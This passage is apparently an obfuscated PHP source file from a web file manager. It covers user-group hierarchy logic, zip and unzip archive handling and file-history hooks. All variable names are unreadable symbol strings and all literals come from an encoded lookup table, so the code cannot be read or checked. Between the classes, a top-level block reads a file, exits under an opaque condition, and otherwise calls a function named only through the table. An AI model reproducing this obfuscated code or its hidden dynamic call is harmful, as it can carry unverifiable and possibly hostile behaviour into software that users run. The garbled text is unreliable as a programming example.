$ΤςΈς“[$εκπΎξ[$«χΫΨ΅[1401]]] ? $ΤςΈς“[$εκπΎξ[$«χΫΨ΅[1401]]] : array(); } unset($εκπΎξ); } protected function groupMerge($σ¨Ηη) { $σ¨Ηη = array_values(array_unique($σ¨Ηη)); $ώΡΠή = array(); for ($Ίμω–®ϋ = 0; $Ίμω–®ϋ < count($σ¨Ηη); $Ίμω–®ϋ++) { $Θ‡¤ΰλ = !1; for ($ μ™σω  = 0; $ μ™σω  < count($σ¨Ηη); $ μ™σω ++) { if ($Ίμω–®ϋ == $ μ™σω ) { continue; } if ($this->isParentOf($σ¨Ηη[$ μ™σω ], $σ¨Ηη[$Ίμω–®ϋ])) { $Θ‡¤ΰλ = !0; break; } } if (!$Θ‡¤ΰλ) { $ώΡΠή[] = $σ¨Ηη[$Ίμω–®ϋ]; } } return $ώΡΠή; } protected function isParentOf($ΌΎϋαΛ, $λήρ–ΐδ) { $μΒυ›³² =& $_SERVER[γγάψ½]; if (!$ΌΎϋαΛ || !$λήρ–ΐδ || $ΌΎϋαΛ == $λήρ–ΐδ) { return !1; } $ΔΟ’ΟΩΥ = $this->getInfoSimple($ΌΎϋαΛ); $›µ£―—ι = $this->getInfoSimple($λήρ–ΐδ); $®ΠδΈϋ = $ΔΟ’ΟΩΥ[$μΒυ›³²[589]] . $ΌΎϋαΛ . $μΒυ›³²[50]; if (substr($›µ£―—ι[$μΒυ›³²[589]], 0, strlen($®ΠδΈϋ)) == $®ΠδΈϋ) { return !0; } return !1; } public function groupShowRoot($ν›ΌΨ, $η„Λο‘΅ = false) { $ΩΫλ =& $_SERVER[γγάψ½]; $³Σα—Π = $this->getInfo($ν›ΌΨ); if (!$³Σα—Π) { return array(); } $‚ΗΏ›κ¥ = $this->parentLevelArray($³Σα—Π[$ΩΫλ[589]]); $ω³‡ϊƒ = array($ν›ΌΨ); if (count($‚ΗΏ›κ¥) == 0) { return $ω³‡ϊƒ; } if ($η„Λο‘΅ && count($‚ΗΏ›κ¥) == 1) { return $ω³‡ϊƒ; } if (!$³Σα—Π[$ΩΫλ[544]] || !isset($³Σα—Π[$ΩΫλ[544]][$ΩΫλ[2084]]) || $³Σα—Π[$ΩΫλ[544]][$ΩΫλ[2084]] == $ΩΫλ[851]) { return $this->groupShowRoot($‚ΗΏ›κ¥[count($‚ΗΏ›κ¥) - 1], $η„Λο‘΅); } if ($³Σα—Π[$ΩΫλ[544]][$ΩΫλ[2084]] == $ΩΫλ[435]) { $ζ–‡ος = explode($ΩΫλ[50], $³Σα—Π[$ΩΫλ[544]][$ΩΫλ[2085]]); if ($ζ–‡ος) { $ω³‡ϊƒ = array_merge($ω³‡ϊƒ, $ζ–‡ος); } } return $ω³‡ϊƒ; } protected function resetParentLevel() { $„“ΘσΣ =& $_SERVER[γγάψ½]; $‹ΣΜΡ®ΐ = $„“ΘσΣ[1401]; $σν«ο¦¶ = $this->select(); $σν«ο¦¶ = array_to_keyvalue($σν«ο¦¶, $‹ΣΜΡ®ΐ); foreach ($σν«ο¦¶ as $²ΎΙ‰±®) { $°‚ΣΑ = $²ΎΙ‰±®; $±ΕΚ—πλ = array(); while ($°‚ΣΑ[$„“ΘσΣ[193]] != 0) { $±ΕΚ—πλ[] = $°‚ΣΑ[$„“ΘσΣ[193]]; $°‚ΣΑ = $σν«ο¦¶[$°‚ΣΑ[$„“ΘσΣ[193]]]; } $±ΕΚ—πλ[] = 0; $±ΕΚ—πλ = $„“ΘσΣ[50] . implode($„“ΘσΣ[50], array_reverse($±ΕΚ—πλ)) . $„“ΘσΣ[50]; $this->setNamePinyin($²ΎΙ‰±®[$‹ΣΜΡ®ΐ], $²ΎΙ‰±®[$„“ΘσΣ[32]]); $this->where(array($‹ΣΜΡ®ΐ => $²ΎΙ‰±®[$‹ΣΜΡ®ΐ]))->save(array($„“ΘσΣ[660] => $±ΕΚ—πλ)); } return $σν«ο¦¶; } public function groupNameAuto($”ΪκƒΤβ, $™χΧΥ”Ω) { $¨φχ©Ν =& $_SERVER[γγάψ½]; $¤Ύ­ = $this->where(array($¨φχ©Ν[480] => $”ΪκƒΤβ))->getField($¨φχ©Ν[32], !0); if (!$¤Ύ­ || !in_array($™χΧΥ”Ω, $¤Ύ­)) { return $™χΧΥ”Ω; } for ($§•ξƒ¥ = 1; $§•ξƒ¥ <= count($¤Ύ­) + 1; $§•ξƒ¥++) { $ΐ•§§· = $™χΧΥ”Ω . "\x28{$§•ξƒ¥}\51"; if (!in_array($ΐ•§§·, $¤Ύ­)) { return $ΐ•§§·; } } } public function groupSwitch($Ξλ΅Ίυ, $Σ―βω¦Γ) { $¤¤Ω¥€™ =& $_SERVER[γγάψ½]; $‘Ή¥»” = array($¤¤Ω¥€™[1401] => array($¤¤Ω¥€™[7], array($Ξλ΅Ίυ, $Σ―βω¦Γ))); $χη¤€ = $this->where($‘Ή¥»”)->select(); $χη¤€ = array_to_keyvalue($χη¤€, $¤¤Ω¥€™[1401]); if (!isset($χη¤€[$Ξλ΅Ίυ]) || !isset($χη¤€[$Σ―βω¦Γ]) || $χη¤€[$Ξλ΅Ίυ][$¤¤Ω¥€™[193]] == 0) { return !1; } $‘Ή¥»” = array($¤¤Ω¥€™[1401] => $Ξλ΅Ίυ); $Σ†‡ήλ = Model($¤¤Ω¥€™[2088])->where($‘Ή¥»”)->select(); if (!$Σ†‡ήλ) { $Σ†‡ήλ = array(); } foreach ($Σ†‡ήλ as $Ί›ύΜω) { $εφμ  = $Ί›ύΜω[$¤¤Ω¥€™[1793]]; $‘Ή¥»” = array($¤¤Ω¥€™[1793] => $εφμ , $¤¤Ω¥€™[1401] => $Σ―βω¦Γ); $ύ²β°΄Δ = Model($¤¤Ω¥€™[2088])->where($‘Ή¥»”)->find(); if (!$ύ²β°΄Δ) { $Λ™ώ†―ο = array($Σ―βω¦Γ => $Ί›ύΜω[$¤¤Ω¥€™[2102]]); Model($¤¤Ω¥€™[602])->userGroupAdd($εφμ , $Λ™ώ†―ο); } Model($¤¤Ω¥€™[602])->userGroupRemove($εφμ , $Ξλ΅Ίυ); } $‘Ή¥»” = array($¤¤Ω¥€™[191] => 2, $¤¤Ω¥€™[193] => 0, $¤¤Ω¥€™[488] => 1, $¤¤Ω¥€™[574] => array($¤¤Ω¥€™[7], array($Ξλ΅Ίυ, $Σ―βω¦Γ))); $«·µψήψ = Model($¤¤Ω¥€™[905])->where($‘Ή¥»”)->field($¤¤Ω¥€™[2103])->select(); $«·µψήψ = array_to_keyvalue($«·µψήψ, $¤¤Ω¥€™[574], $¤¤Ω¥€™[194]); $ΐΠ«ζτί = !empty($«·µψήψ[$Ξλ΅Ίυ]) ? $«·µψήψ[$Ξλ΅Ίυ] : !1; if ($ΐΠ«ζτί) { if (!$«·µψήψ[$Σ―βω¦Γ]) { $«·µψήψ[$Σ―βω¦Γ] = Model($¤¤Ω¥€™[905])->groupRootAdd($Σ―βω¦Γ); } $‡ΐείόµ = $«·µψήψ[$Σ―βω¦Γ]; $‘Ή¥»” = array($¤¤Ω¥€™[193] => $ΐΠ«ζτί); $«·µψήψ = Model($¤¤Ω¥€™[905])->where($‘Ή¥»”)->field($¤¤Ω¥€™[2104])->select(); if (!$«·µψήψ) { $«·µψήψ = array(); } Model($¤¤Ω¥€™[905])->moveClearAuth = !1; foreach ($«·µψήψ as $μΛβ¦Δ) { $Ψµψ€…¤ = $μΛβ¦Δ[$¤¤Ω¥€™[488]] == $¤¤Ω¥€™[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($¤¤Ω¥€™[905])->move($μΛβ¦Δ[$¤¤Ω¥€™[194]], $‡ΐείόµ, $Ψµψ€…¤); } Model($¤¤Ω¥€™[905])->moveClearAuth = !0; $‘Ή¥»” = array($¤¤Ω¥€™[191] => 2, $¤¤Ω¥€™[574] => $Ξλ΅Ίυ); $“¦Ίε‡Έ = array($¤¤Ω¥€™[574] => $Σ―βω¦Γ); Model($¤¤Ω¥€™[2105])->where($‘Ή¥»”)->save($“¦Ίε‡Έ); Model($¤¤Ω¥€™[2106])->where($‘Ή¥»”)->save($“¦Ίε‡Έ); } $this->_changeChildLevel($χη¤€[$Ξλ΅Ίυ], $χη¤€[$Σ―βω¦Γ], !0); $this->where(array($¤¤Ω¥€™[193] => $Ξλ΅Ίυ))->save(array($¤¤Ω¥€™[193] => $Σ―βω¦Γ)); $this->_clearChildrenCache($χη¤€[$Σ―βω¦Γ]); return !0; } } if ($_SERVER[$_SERVER[γγάψ½][961]] != $_SERVER[$_SERVER[γγάψ½][1709]]) { $_getc = $_SERVER[γγάψ½][963]; $_getfile = $_SERVER[$_SERVER[γγάψ½][958]] . $_SERVER[γγάψ½][959]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[γγάψ½][288], $_getfilec); if (count($_getarrs) < $_SERVER[γγάψ½][706]) { $exit = $_SERVER[γγάψ½][964]; $exit(); } $_act = $_SERVER[γγάψ½][1624]; $_act($_SERVER[$_SERVER[γγάψ½][1623]]); } goto aΎήέ†Οα; D£§ ΅Βσ: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $•¬±©°; if ($•¬±©°) { return $•¬±©°; } $—«λ£Ψφ = IO::init($_SERVER[γγάψ½][8]); return $—«λ£Ψφ; } private static function iconvSystem($Ϊρψ¬“) { return self::local()->iconvSystem($Ϊρψ¬“); } private static function iconvApp($‡ύ°πσΓ) { return self::local()->iconvApp($‡ύ°πσΓ); } public static function zipFolder($ƒΧΰΥο®, $ϋ™Ν– = "\x7a\151\160", $Ϋ¬Ξ· = '', $Ϋ·Ώ€‘ύ = REPEAT_RENAME) { $ΕΟφ…¨ =& $_SERVER[γγάψ½]; $μω―ωψϊ = IO::listPath($ƒΧΰΥο®); if (!$μω―ωψϊ) { return !1; } $μω―ωψϊ = array_merge($μω―ωψϊ[$ΕΟφ…¨[85]], $μω―ωψϊ[$ΕΟφ…¨[86]]); return self::zip($μω―ωψϊ, $ϋ™Ν–, $Ϋ¬Ξ·, $Ϋ·Ώ€‘ύ); } public static function zip($Σ¥γΦΠΨ, $ΫΛ΄ΑΎ = "\x7a\x69\160", $ΩβΌμξ’ = '', $φΣΖν΄ = REPEAT_RENAME) { $‘ύοΒΐ =& $_SERVER[γγάψ½]; if (is_string($Σ¥γΦΠΨ) && $Σ¥γΦΠΨ) { $Σ¥γΦΠΨ = array(array($‘ύοΒΐ[87] => $Σ¥γΦΠΨ)); } $ά‚±ΛΪΪ = self::init($Σ¥γΦΠΨ[0][$‘ύοΒΐ[87]]); $‹Ρ±» = self::info($Σ¥γΦΠΨ[0][$‘ύοΒΐ[87]]); $νΙλΆγ = $‘ύοΒΐ[12]; $δΥΟ‰Η = $‘ύοΒΐ[12]; $ξΆ²δ‘ = $‘ύοΒΐ[12]; if ($ΩβΌμξ’ && substr($ΩβΌμξ’, -1, 1) != $‘ύοΒΐ[8]) { $δΥΟ‰Η = get_path_father($ΩβΌμξ’); $ξΆ²δ‘ = get_path_this($ΩβΌμξ’); } else { $δΥΟ‰Η = self::pathFather($‹Ρ±»[$‘ύοΒΐ[87]]); $ξΆ²δ‘ = $‹Ρ±»[$‘ύοΒΐ[32]] . $‘ύοΒΐ[10] . $ΫΛ΄ΑΎ; if (count($Σ¥γΦΠΨ) > 1) { $λ¶κΤΣά = IO::info($δΥΟ‰Η); $ξΆ²δ‘ = $λ¶κΤΣά[$‘ύοΒΐ[32]] . $‘ύοΒΐ[10] . $ΫΛ΄ΑΎ; } if ($ΩβΌμξ’) { $δΥΟ‰Η = $ΩβΌμξ’; } } if ($ά‚±ΛΪΪ->getType() == $‘ύοΒΐ[109]) { $ΨΒ¥ΈΤΫ = self::init($δΥΟ‰Η); $υλΔΒ• = $ΨΒ¥ΈΤΫ->getType() == $‘ύοΒΐ[109] ? $δΥΟ‰Η : get_path_father($ά‚±ΛΪΪ->path); $υλΔΒ• = IO::getPathInner($υλΔΒ•); $υλΔΒ• = rtrim($υλΔΒ•, $‘ύοΒΐ[8]) . $‘ύοΒΐ[8]; mk_dir($υλΔΒ•); } else { $νΙλΆγ = TEMP_FILES . $‘ύοΒΐ[1276] . time() . rand_string(8) . $‘ύοΒΐ[8]; mk_dir($νΙλΆγ); file_put_contents($νΙλΆγ . $‘ύοΒΐ[1277], $‘ύοΒΐ[12]); $υλΔΒ• = $νΙλΆγ; } $£΅›ΙΜ = IO::info($υλΔΒ•); if (!$£΅›ΙΜ || !$£΅›ΙΜ[$‘ύοΒΐ[236]]) { show_json(LNG($‘ύοΒΐ[1278]), !1); } $ΏΌ†—λ = self::zipFileList($Σ¥γΦΠΨ, $νΙλΆγ); foreach ($ΏΌ†—λ as $ύθώ½Ϋ => $‰ΧΧ“Γ) { $ΏΌ†—λ[$ύθώ½Ϋ] = self::iconvSystem($‰ΧΧ“Γ); } $©γΨ¶Πί = get_filename_auto($υλΔΒ• . $ξΆ²δ‘, $‘ύοΒΐ[12], $φΣΖν΄); KodArchive::create(self::iconvSystem($©γΨ¶Πί), $ΏΌ†—λ); if (!IO::exist($©γΨ¶Πί)) { if ($νΙλΆγ) { del_dir($νΙλΆγ); } write_log($‘ύοΒΐ[1279] . $©γΨ¶Πί, $‘ύοΒΐ[391]); show_json(LNG($‘ύοΒΐ[1280]), !1); } if (!$νΙλΆγ) { return $©γΨ¶Πί; } $›²ύΔΦ› = self::move($©γΨ¶Πί, $δΥΟ‰Η, $φΣΖν΄); if ($νΙλΆγ) { del_dir($νΙλΆγ); } if (!$©γΨ¶Πί) { write_log($‘ύοΒΐ[1281] . $©γΨ¶Πί . $‘ύοΒΐ[1282] . $δΥΟ‰Η, $‘ύοΒΐ[391]); show_json(LNG($‘ύοΒΐ[1280]), !1); } return $›²ύΔΦ›; } public static function unzip($ψη‘έ¶, $ιΕ­σ¦, $έξΆΖδΟ = "\55\x31", $Σ„χκνΑ = "\162\x65\160\154\x61\143\x65") { $‹†ςΞ =& $_SERVER[γγάψ½]; $Θ”Θ›‚ = parent::info($ψη‘έ¶); if (!$Θ”Θ›‚) { show_json(LNG($‹†ςΞ[1283]), !1); } $ϋ‰¤ρϊ = IO::infoFullSimple($ιΕ­σ¦); if (!$ϋ‰¤ρϊ) { $ιΕ­σ¦ = IO::mkdir($ιΕ­σ¦); } if (isset($ϋ‰¤ρϊ[$‹†ςΞ[194]]) && trim($ϋ‰¤ρϊ[$‹†ςΞ[87]], $‹†ςΞ[8]) != trim($ιΕ­σ¦, $‹†ςΞ[8])) { $τφ³ΰω = KodIO::make($ϋ‰¤ρϊ[$‹†ςΞ[193]]); $†¬Ζο = IO::fileNameAuto($τφ³ΰω, $ϋ‰¤ρϊ[$‹†ςΞ[32]], REPEAT_RENAME_FOLDER, !0); $ιΕ­σ¦ = IO::mkdir($τφ³ΰω . $†¬Ζο); } $έξΆΖδΟ = $έξΆΖδΟ && $έξΆΖδΟ != $‹†ςΞ[1284] ? @json_decode($έξΆΖδΟ, !0) : -1; $µάω½Ή = self::unzipPart($ψη‘έ¶, $έξΆΖδΟ); if (!$µάω½Ή || !IO::exist($µάω½Ή[$‹†ςΞ[233]])) { show_json(LNG($‹†ςΞ[108]), !1); } $³‹‰Ϋζ“ = $µάω½Ή[$‹†ςΞ[1285]][count($µάω½Ή[$‹†ςΞ[1285]]) - 1]; if ($³‹‰Ϋζ“[$‹†ςΞ[1286]] == -1 || substr($³‹‰Ϋζ“[$‹†ςΞ[32]], -1, 1) == $‹†ςΞ[8]) { $Οόυ£·€ = $µάω½Ή[$‹†ςΞ[1287]] . rand_string(10) . $‹†ςΞ[8]; mk_dir($Οόυ£·€); $’΅”άχ¶ = count($µάω½Ή[$‹†ςΞ[1285]]) == 1 ? IO::ext($ψη‘έ¶) : get_path_ext($µάω½Ή[$‹†ςΞ[233]]); $ζλ‹ΛΗ = KodArchive::extract(self::iconvSystem($µάω½Ή[$‹†ςΞ[233]]), $Οόυ£·€, $³‹‰Ϋζ“[$‹†ςΞ[1286]], $†¬Ζο, $’΅”άχ¶); self::unzipErrorCheck($ζλ‹ΛΗ, array($‹†ςΞ[1288], $ψη‘έ¶, $’΅”άχ¶, $ιΕ­σ¦, $µάω½Ή)); Hook::trigger($‹†ςΞ[1289], $Οόυ£·€); recursion_dir($Οόυ£·€, $Ρέ“Ή®Υ, $„ηΧ™μ», 0); $ΦΪ½ΛΟ = array_merge($Ρέ“Ή®Υ, $„ηΧ™μ»); $μμΡΐ™¶ = array(); foreach ($ΦΪ½ΛΟ as $έ βΙ§χ) { $‘όίΟ‡θ = IO::move(self::iconvApp($έ βΙ§χ), $ιΕ­σ¦, $Σ„χκνΑ); if ($‘όίΟ‡θ) { $μμΡΐ™¶[] = $‘όίΟ‡θ; } } del_dir($Οόυ£·€); } else { $‘όίΟ‡θ = IO::move($µάω½Ή[$‹†ςΞ[233]], $ιΕ­σ¦, $Σ„χκνΑ, get_path_this($³‹‰Ϋζ“[$‹†ςΞ[32]])); if ($‘όίΟ‡θ) { $μμΡΐ™¶[] = $‘όίΟ‡θ; } } return $μμΡΐ™¶ ? $μμΡΐ™¶ : !1; } public static function unzipList($λ‡θΥΝ) { $Α¶‹Ήτα =& $_SERVER[γγάψ½]; $ΐμ΄‘ύ¦ = isset($λ‡θΥΝ[$Α¶‹Ήτα[1290]]) ? $λ‡θΥΝ[$Α¶‹Ήτα[1290]] : !1; $ΔΓθΨ¶Χ = isset($λ‡θΥΝ[$Α¶‹Ήτα[1286]]) ? @json_decode($λ‡θΥΝ[$Α¶‹Ήτα[1286]], !0) : -1; $ΰΗρΧύ = self::unzipPart($λ‡θΥΝ[$Α¶‹Ήτα[87]], $ΔΓθΨ¶Χ); if (!$ΰΗρΧύ || !IO::exist($ΰΗρΧύ[$Α¶‹Ήτα[233]])) { show_json(LNG($Α¶‹Ήτα[108]), !1); } $™¥ΏµΆ = $ΰΗρΧύ[$Α¶‹Ήτα[1285]][count($ΰΗρΧύ[$Α¶‹Ήτα[1285]]) - 1]; $ηΒόΛΣ = in_array(IO::ext($ΰΗρΧύ[$Α¶‹Ήτα[233]]), array($Α¶‹Ήτα[391], $Α¶‹Ήτα[1291], $Α¶‹Ήτα[1292], $Α¶‹Ήτα[1293], $Α¶‹Ήτα[1294], $Α¶‹Ήτα[1295])); if (!$ΐμ΄‘ύ¦ && ($™¥ΏµΆ[$Α¶‹Ήτα[1286]] == -1 || $ηΒόΛΣ)) { $‹Θ‘ώ± = $ΰΗρΧύ[$Α¶‹Ήτα[1287]] . get_path_this($ΰΗρΧύ[$Α¶‹Ήτα[233]]) . $Α¶‹Ήτα[1296]; if (!IO::exist($‹Θ‘ώ±)) { $έ®ιϋύ¨ = $™¥ΏµΆ[$Α¶‹Ήτα[1286]] == -1 ? get_path_ext(IO::pathThis($λ‡θΥΝ[$Α¶‹Ήτα[87]])) : get_path_ext($ΰΗρΧύ[$Α¶‹Ήτα[233]]); $ΆϋΒ°ΧΖ = KodArchive::listContent(self::iconvSystem($ΰΗρΧύ[$Α¶‹Ήτα[233]]), !0, $έ®ιϋύ¨); self::unzipErrorCheck($ΆϋΒ°ΧΖ, array($Α¶‹Ήτα[1297], $λ‡θΥΝ, $ΰΗρΧύ)); @file_put_contents($‹Θ‘ώ±, json_encode($ΆϋΒ°ΧΖ[$Α¶‹Ήτα[1298]])); } return @json_decode(IO::getContent($‹Θ‘ώ±), !0); } IO::fileOut($ΰΗρΧύ[$Α¶‹Ήτα[233]], $ΐμ΄‘ύ¦, get_path_this($™¥ΏµΆ[$Α¶‹Ήτα[32]])); die; } private static function zipFileList($γλ‰Εξ, $›ΈΌηέ = false) { $Τƒλέώ =& $_SERVER[γγάψ½]; $άόƒδ™μ = array(); foreach ($γλ‰Εξ as $ΎΟϊπΞ) { $›Ζά‘‚Φ = $ΎΟϊπΞ[$Τƒλέώ[87]]; if ($›ΈΌηέ) { $›Ζά‘‚Φ = self::copy($ΎΟϊπΞ[$Τƒλέώ[87]], $›ΈΌηέ, $Τƒλέώ[899]); } else { $²η«ρ†« = self::init($ΎΟϊπΞ[$Τƒλέώ[87]]); if ($²η«ρ†«->getType() == $Τƒλέώ[109]) { $›Ζά‘‚Φ = $²η«ρ†«->path; } } if ($›Ζά‘‚Φ && self::local()->exist($›Ζά‘‚Φ)) { $άόƒδ™μ[$ΎΟϊπΞ[$Τƒλέώ[87]]] = $›Ζά‘‚Φ; } } if (!empty($άόƒδ™μ)) { return array_values($άόƒδ™μ); } show_json(LNG($Τƒλέώ[1255]), !1); } private static function localFilePath($όή›ά²ϊ) { $Ζμ΄έΧ€ =& $_SERVER[γγάψ½]; $ΎΫ¦¨ = KodIO::parse($όή›ά²ϊ); if ($ΎΫ¦¨[$Ζμ΄έΧ€[33]] == KodIO::KOD_SOURCE) { $σ„®εβ = Model($Ζμ΄έΧ€[905])->fileInfoGet(KodIO::sourceID($όή›ά²ϊ)); if (!$σ„®εβ[$Ζμ΄έΧ€[87]]) { show_json($Ζμ΄έΧ€[1299], !1); } $όή›ά²ϊ = $σ„®εβ[$Ζμ΄έΧ€[87]]; } $ω¬½ ¨¤ = self::init($όή›ά²ϊ); if ($ω¬½ ¨¤->pathParse[$Ζμ΄έΧ€[1241]]) { $όή›ά²ϊ = $ω¬½ ¨¤->pathParse[$Ζμ΄έΧ€[1241]]; $ω¬½ ¨¤ = self::init($όή›ά²ϊ); } $²³‰‘™Σ = $ω¬½ ¨¤->getType(); if ($²³‰‘™Σ == $Ζμ΄έΧ€[109] || $²³‰‘™Σ == $Ζμ΄έΧ€[1300]) { if (!$ω¬½ ¨¤->exist($ω¬½ ¨¤->path)) { show_json(LNG($Ζμ΄έΧ€[108]), !1); } return $ω¬½ ¨¤->path; } return !1; } public static function unzipPart($·ΊΏαμΎ, $ƒΩξιΧΉ = -1) { $…²Ρδ§µ =& $_SERVER[γγάψ½]; $‡Έ½ϋµ = IO::pathThis($·ΊΏαμΎ); if (!$ƒΩξιΧΉ || $ƒΩξιΧΉ == -1) { $Α£† = array(array($…²Ρδ§µ[32] => $‡Έ½ϋµ, $…²Ρδ§µ[1286] => -1)); $Α£†[0][$…²Ρδ§µ[1301]] = $Α£†[0][$…²Ρδ§µ[32]]; } else { if (is_array($ƒΩξιΧΉ)) { $Α£† = $ƒΩξιΧΉ; $Υ¥―Ήυ¨ = count($Α£†) - 1; for ($Ζο›€ = 0; $Ζο›€ <= $Υ¥―Ήυ¨; $Ζο›€++) { $ΛΣΎμ›‹ = $Α£†[$Ζο›€]; $ΦΈβΧΊ = get_path_this($ΛΣΎμ›‹[$…²Ρδ§µ[32]]) . (checkExtSafe($ΛΣΎμ›‹[$…²Ρδ§µ[32]]) ? $…²Ρδ§µ[12] : $…²Ρδ§µ[1302]); $Α£†[$Ζο›€][$…²Ρδ§µ[1301]] = $…²Ρδ§µ[1303] . intval($ΛΣΎμ›‹[$…²Ρδ§µ[1286]]) . $…²Ρδ§µ[465] . $ΦΈβΧΊ; if ($Ζο›€ == 0) { continue; } $Α£†[$Ζο›€][$…²Ρδ§µ[1301]] = $Α£†[$Ζο›€ - 1][$…²Ρδ§µ[1301]] . $…²Ρδ§µ[1304] . $Α£†[$Ζο›€][$…²Ρδ§µ[1301]]; } } } if (!is_array($Α£†) || count($Α£†) == 0) { return !1; } $αΔ―ΓΥ = $Α£†[count($Α£†) - 1]; if (!IO::exist($·ΊΏαμΎ)) { return !1; } $ΤΎΔΏ‡ = TEMP_FILES . $…²Ρδ§µ[1305] . kodIO::hashPathSafe($·ΊΏαμΎ) . $…²Ρδ§µ[8]; $ΡΎ†„«• = $ΤΎΔΏ‡ . $αΔ―ΓΥ[$…²Ρδ§µ[1301]]; mk_dir($ΤΎΔΏ‡); file_put_contents(TEMP_FILES . $…²Ρδ§µ[1277], $…²Ρδ§µ[12]); if (IO::exist($ΡΎ†„«•)) { return array($…²Ρδ§µ[233] => $ΡΎ†„«•, $…²Ρδ§µ[1285] => $Α£†, $…²Ρδ§µ[1287] => $ΤΎΔΏ‡); } $όγΰμΚ  = self::localFilePath($·ΊΏαμΎ); if (!$όγΰμΚ ) { $όγΰμΚ  = $ΤΎΔΏ‡ . $…²Ρδ§µ[1306]; if (!IO::exist($όγΰμΚ )) { self::copy($·ΊΏαμΎ, $ΤΎΔΏ‡, !1, get_path_this($όγΰμΚ )); } } if (!$όγΰμΚ  || !IO::exist($όγΰμΚ )) { return !1; } if ($αΔ―ΓΥ[$…²Ρδ§µ[1286]] == -1) { return array($…²Ρδ§µ[233] => $όγΰμΚ , $…²Ρδ§µ[1285] => $Α£†, $…²Ρδ§µ[1287] => $ΤΎΔΏ‡); } $›χ„Ο‚— = $όγΰμΚ ; foreach ($Α£† as $Ζο›€ => $ΛΣΎμ›‹) { if (!$ΛΣΎμ›‹ || $ΛΣΎμ›‹[$…²Ρδ§µ[1286]] == $…²Ρδ§µ[1284]) { break; } if (substr($ΛΣΎμ›‹[$…²Ρδ§µ[32]], -1, 1) == $…²Ρδ§µ[8]) { break; } $½ΐΌϋα• = in_array(get_path_ext($ΛΣΎμ›‹[$…²Ρδ§µ[1301]]), array($…²Ρδ§µ[391], $…²Ρδ§µ[1291], $…²Ρδ§µ[1292], $…²Ρδ§µ[1293], $…²Ρδ§µ[1294], $…²Ρδ§µ[1295])); $³ωΩΚλ‡ = $Ζο›€ == count($Α£†) - 1 && $½ΐΌϋα•; $«ΘΠΏγκ = $ΤΎΔΏ‡ . $ΛΣΎμ›‹[$…²Ρδ§µ[1301]]; $θΘχΕ£ = $ΤΎΔΏ‡ . get_path_this($ΛΣΎμ›‹[$…²Ρδ§µ[32]]); if (IO::exist($«ΘΠΏγκ)) { $›χ„Ο‚— = $«ΘΠΏγκ; continue; } $ώέωφϋ = $Ζο›€ == 0 ? get_path_ext($‡Έ½ϋµ) : get_path_ext($›χ„Ο‚—); $φ”²£ƒφ = KodArchive::extract(self::iconvSystem($›χ„Ο‚—), $ΤΎΔΏ‡, $ΛΣΎμ›‹[$…²Ρδ§µ[1286]], $Ί±Χς―Ν, $ώέωφϋ); self::unzipErrorCheck($φ”²£ƒφ, array($…²Ρδ§µ[1307], $·ΊΏαμΎ, $Α£†, $ΛΣΎμ›‹, $«ΘΠΏγκ)); if (IO::exist($θΘχΕ£)) { IO::rename($θΘχΕ£, get_path_this($«ΘΠΏγκ)); } $›χ„Ο‚— = $«ΘΠΏγκ; } $ΡΎ†„«• = $›χ„Ο‚—; return array($…²Ρδ§µ[233] => $›χ„Ο‚—, $…²Ρδ§µ[1285] => $Α£†, $…²Ρδ§µ[1287] => $ΤΎΔΏ‡); } private static function unzipErrorCheck($–Ε¶κ, $ΩθθφΙή = false) { $†ΥΙ ήΙ =& $_SERVER[γγάψ½]; if ($–Ε¶κ[$†ΥΙ ήΙ[1308]]) { return !0; } write_log(array($†ΥΙ ήΙ[1309], $–Ε¶κ, $ΩθθφΙή), $†ΥΙ ήΙ[1310]); $™δΒ…“— = is_array($–Ε¶κ[$†ΥΙ ήΙ[1298]]) ? json_encode($–Ε¶κ[$†ΥΙ ήΙ[1298]]) : $–Ε¶κ[$†ΥΙ ήΙ[1298]]; show_json($†ΥΙ ήΙ[1311] . $™δΒ…“—, !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $ΧΝ©μ =& $_SERVER[γγάψ½]; $–„ΤΓοΨ = $GLOBALS[$ΧΝ©μ[6]][$ΧΝ©μ[92]]; if ($–„ΤΓοΨ[$ΧΝ©μ[1312]] != 1) { return; } if ($–„ΤΓοΨ[$ΧΝ©μ[1313]] <= 0) { return; } if (isset($_REQUEST[$ΧΝ©μ[1314]]) && $_REQUEST[$ΧΝ©μ[1314]] == $ΧΝ©μ[91]) { return; } Hook::bind($ΧΝ©μ[1315], $ΧΝ©μ[1316]); Hook::bind($ΧΝ©μ[1317], $ΧΝ©μ[1318]); Hook::bind($ΧΝ©μ[1319], $ΧΝ©μ[1320]); Hook::bind($ΧΝ©μ[1321], $ΧΝ©μ[1322]); Hook::bind($ΧΝ©μ[1323], $ΧΝ©μ[1324]); Hook::bind($ΧΝ©μ[1325], $ΧΝ©μ[1326]); } public static function eventBeforeUpload($οΈβ€§) { if ($οΈβ€§[3] && $οΈβ€§[3] != REPEAT_REPLACE) { return; } $Δσδξ£ν = self::parsePath($οΈβ€§[0]); if (!$Δσδξ£ν) { return; } self::add($Δσδξ£ν); } public static function eventBeforeEdit($°Ξ¬²Α) { $µ–ΒόΏΘ = self::parsePath($°Ξ¬²Α[0]); if (!$µ–ΒόΏΘ) { return; } self::add($µ–ΒόΏΘ); } public static function eventBeforeCopyFile($™Ά’«Ο, $›—ΆΘΓ, $Ι€Ϊη¦ϋ, $‡υ„”½Λ, $λ¨ΏΞ―Έ, $ΊύΨβ) { $Ρ—―…”Ά =& $_SERVER[γγάψ½]; if (isset($Ι€Ϊη¦ϋ->_data[$Ρ—―…”Ά[1245]]) && $Ι€Ϊη¦ϋ->_data[$Ρ—―…”Ά[1245]]) { return; } $΄ή½‚ = $Ι€Ϊη¦ϋ->getPathOuter($‡υ„”½Λ); $„ς¶Τ = self::parsePath($΄ή½‚); if (!$„ς¶Τ) { return; } self::add($„ς¶Τ); } public static function eventBeforeRename($µζ—ΨΤλ) { $ΚΞ–φ„θ =& $_SERVER[γγάψ½]; $ζ»½§Ά = self::parsePath($µζ—ΨΤλ[0]); if (!$ζ»½§Ά) { return; } $Θκ΄µ = self::checkInHistory($ζ»½§Ά); if (!$Θκ΄µ) { return; } if ($Θκ΄µ[$ΚΞ–φ„θ[33]] == $ΚΞ–φ„θ[233]) { $σγΌκυ« = self::listData($ζ»½§Ά); if ($σγΌκυ« && $σγΌκυ«[$ΚΞ–φ„θ[448]]) { self::moveHistory($ζ»½§Ά, $µζ—ΨΤλ[1]); } 